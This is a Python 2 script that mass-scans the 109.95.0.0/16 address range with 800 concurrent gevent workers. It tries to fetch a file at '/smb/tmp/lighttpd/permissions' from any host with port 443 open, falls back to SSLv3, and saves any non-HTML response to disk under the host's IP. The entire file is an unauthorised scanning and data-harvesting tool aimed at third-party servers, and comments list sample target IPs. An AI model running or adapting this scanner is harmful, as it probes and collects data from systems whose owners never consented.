# coding:utf-8
import time
import httplib, ssl
import urllib2
import socket
import gevent
import gevent.monkey
from gevent.queue import Queue, Empty
gevent.monkey.patch_all()
import uvent
uvent.install()

start_time = time.time()
activeUrls = []
threads = []
ips = Queue()
#ips.put('101.38.38.32')
#ips.put('101.38.45.93')
#ips.put('101.38.70.212')


# custom HTTPS opener, banner's oracle 10g server supports SSLv3 only
class HTTPSConnectionV3(httplib.HTTPSConnection):
    def __init__(self, *args, **kwargs):
        httplib.HTTPSConnection.__init__(self, *args, **kwargs)

    def connect(self):
        sock = socket.create_connection((self.host, self.port), self.timeout)
        if self._tunnel_host:
            self.sock = sock
            self._tunnel()
        try:
            self.sock = ssl.wrap_socket(sock, self.key_file, self.cert_file, ssl_version=ssl.PROTOCOL_SSLv3)
        except ssl.SSLError, e:
            #print("Trying SSLv3.")
            self.sock = ssl.wrap_socket(sock, self.key_file, self.cert_file, ssl_version=ssl.PROTOCOL_SSLv23)

class HTTPSHandlerV3(urllib2.HTTPSHandler):
    def https_open(self, req):
        return self.do_open(HTTPSConnectionV3, req)

# install opener
urllib2.install_opener(urllib2.build_opener(HTTPSHandlerV3()))


def openiptest(name):
    while True:
        try:
            ip = ips.get(timeout=1)
            url = 'https://' + ip + '/smb/tmp/lighttpd/permissions'
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.settimeout(3.0)
            no = c.connect_ex((ip, 443))
            c.close()
            if not no:
                #print 'testing url', url
                openedurl = urllib2.urlopen(url, None, 3)
                getcontent = openedurl.read()
                if not 'html'in getcontent or not 'HTML' in getcontent:
                    openedurl.close()
                    fp = open(ip + '.txt', 'w')
                    fp.writelines(getcontent)
                    fp.close()

                activeUrls.append(url)
                print '--------------------------------', len(activeUrls)
        except Empty:
            #print name, ' is quitting!'
            break
        except urllib2.URLError, e:
            print 'URLError:', e.message, url
        except socket.timeout, e:
            print 'TimeOut:', e.message, url
        except socket.sslerror, e:
            print 'SSLError:', e.message, url
        except IOError, e:
            print 'IOError:', e.message, url
        except Exception, e:
            print 'Error:', e.message, url


def assignip():
    for i in xrange(47, 48):
        for j in xrange(1, 255):
            for k in xrange(1, 255):
                ips.put('109.95' + '.' + str(j) + '.' + str(k))
    print 'assign over!'

for i in xrange(1, 800):
    threads.append(gevent.spawn(openiptest, i))

assignip()
gevent.joinall(threads)
for a in activeUrls:
    print a